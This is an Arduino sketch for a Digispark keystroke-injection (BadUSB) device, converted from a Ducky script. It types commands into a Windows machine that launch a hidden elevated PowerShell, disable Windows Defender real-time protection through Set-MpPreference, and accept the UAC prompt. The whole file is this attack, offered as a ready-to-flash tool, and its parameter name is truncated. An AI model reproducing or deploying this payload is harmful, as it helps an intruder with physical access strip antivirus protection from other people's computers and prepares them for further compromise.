// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 

#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  // Turn off Windows Defender
  //
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);
  
     DigiKeyboard.delay(200);
  // Start an elevated powershell instance which will disable Windows Defender.
  DigiKeyboard.print("powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs ");
   DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // if you need administrator [left, enter and delay 1000]
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
   for (;;) {
    /*Stops the digispark from running the scipt again*/
  
 
  }
}
